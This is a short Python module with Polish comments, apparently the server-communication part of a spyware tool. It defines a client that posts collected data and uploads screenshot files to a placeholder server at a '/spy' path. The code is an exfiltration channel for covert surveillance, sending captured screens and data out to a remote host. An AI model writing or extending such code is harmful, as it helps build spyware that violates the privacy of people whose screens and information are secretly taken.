import requests
import json
from datetime import datetime

class ServerClient:
    def __init__(self):
        self.server_url = "http://twoj_serwer.pl/spy"
        self.session_id = None
    
    def send_data(self, data):
        """Wysyła dane do serwera"""
        try:
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                f"{self.server_url}/data",
                json=data,
                headers=headers,
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"Błąd komunikacji z serwerem: {e}")
            return False
    
    def send_screenshot(self, screenshot_path):
        """Wysyła zrzut ekranu do serwera"""
        try:
            with open(screenshot_path, 'rb') as f:
                files = {'file': f}
                data = {
                    'type': 'screenshot',
                    'timestamp': datetime.now().isoformat()
                }
                
                response = requests.post(
                    f"{self.server_url}/upload",
                    files=files,
                    data=data
                )
                
                return response.status_code == 200
                
        except Exception as e:
            print(f"Błąd wysyłania zrzutu: {e}")
            return False
